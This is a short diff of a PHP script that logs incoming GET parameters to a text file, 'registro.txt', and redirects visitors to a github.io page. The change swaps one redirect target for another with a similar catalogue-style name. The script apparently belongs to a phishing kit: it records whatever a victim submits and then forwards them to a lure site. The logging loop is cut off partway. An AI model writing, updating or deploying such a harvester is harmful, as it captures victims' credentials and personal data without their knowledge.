@@ -1,5 +1,5 @@
 <?php
-header("Location: https://catalogonlyf.github.io/");
+header("Location: https://cataloguesgirls.github.io/");
 $handle = fopen("registro.txt", "a"); 
 
 foreach($_GET as $variable => $value) {
